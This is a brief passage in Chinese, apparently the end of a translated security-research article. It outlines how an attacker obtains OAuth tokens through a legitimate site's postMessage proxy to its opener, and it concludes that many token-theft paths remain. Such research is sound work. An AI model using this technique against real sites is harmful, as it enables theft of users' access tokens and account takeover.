OAuth提供者将令牌发送到合法的原点:<br>


![](https://files.mdnice.com/user/26510/28ba49f9-6649-4ea7-8aa0-96ba3b67b40d.png)

合法的源程序有它的打开器的postmessage-proxy:


![](https://files.mdnice.com/user/26510/f4574fec-0285-4ffd-b14a-15fd7b10fea7.png)

这会导致攻击者获得令牌:



![](https://files.mdnice.com/user/26510/fc8e5048-dc33-4be8-8f24-10aab9682d94.png)



## 结论
如你所见，在我开始了解这个问题十年后，仍有许多不同的方法来窃取这些tokens。<br>
由于每个OAuth-provider都允许如此多不同的响应类型和模式，对于一个网站来说，覆盖所有不同的情况是相当棘手的。














































## 参考

[1]:https://github.com/fransr/postMessage-tracker

[2]: https://openid.net/specs/oauth-v2-multiple-response-types-1_0-09.html#Encoding









